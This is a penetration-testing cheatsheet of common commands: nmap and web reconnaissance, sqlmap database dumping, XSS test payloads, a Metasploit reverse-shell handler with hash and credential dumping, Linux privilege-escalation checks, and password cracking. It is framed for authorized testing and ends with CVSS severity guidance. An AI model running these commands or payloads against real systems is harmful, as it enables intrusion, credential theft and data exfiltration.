# Penetration Testing — Cheatsheet

```bash
# !! ONLY USE ON SYSTEMS YOU OWN OR HAVE WRITTEN AUTHORIZATION !!

# ── RECONNAISSANCE ────────────────────────────────────────
whois target.com
dig target.com ANY
nmap -sn 192.168.1.0/24              # Ping sweep
nmap -sV -sC -p- target.com          # Full port scan + scripts
nmap -A target.com                    # Aggressive (OS + services)
nmap --script vuln target.com        # Run vuln scripts

# ── WEB RECON ─────────────────────────────────────────────
curl -I https://target.com            # Headers fingerprinting
nikto -h https://target.com           # Web scanner
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ffuf -u https://target.com/FUZZ -w wordlist.txt

# ── SQL INJECTION ─────────────────────────────────────────
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# ── XSS TEST PAYLOADS ─────────────────────────────────────
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>

# ── METASPLOIT ────────────────────────────────────────────
msfconsole
search type:exploit platform:windows
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run

# Meterpreter commands
sysinfo; getuid; getsystem    # System info and privilege escalation
upload /local/file /remote/   # Upload file
download /remote/file /local/ # Download file
shell                          # Drop to OS shell
hashdump                       # Dump password hashes
run post/windows/gather/credentials/credential_collector

# ── LINUX PRIVILEGE ESCALATION ────────────────────────────
sudo -l                                    # Sudo permissions
find / -perm /4000 2>/dev/null            # SUID files
find / -writable -type f 2>/dev/null      # World-writable files
cat /etc/crontab; ls /etc/cron.d/         # Cron jobs
ps aux | grep root                         # Root processes
# linpeas.sh → automated PE script (github.com/carlospolop/PEASS-ng)

# ── PASSWORD CRACKING ─────────────────────────────────────
hashcat -m 0 hashes.txt wordlist.txt      # MD5
hashcat -m 1000 hashes.txt wordlist.txt   # NTLM
hashcat -m 1800 hashes.txt wordlist.txt   # SHA-512 (Linux /etc/shadow)
john --wordlist=wordlist.txt hashes.txt

# ── REPORT SEVERITY (CVSS v3.1) ──────────────────────────
# Critical: 9.0-10.0  → Remote code execution, no auth
# High:     7.0-8.9   → Significant impact, some conditions
# Medium:   4.0-6.9   → Requires auth or user interaction
# Low:      0.1-3.9   → Limited impact
# Info:     0.0       → Best practice issue, no direct risk

# ── CVSS CALCULATOR ───────────────────────────────────────
# https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
```
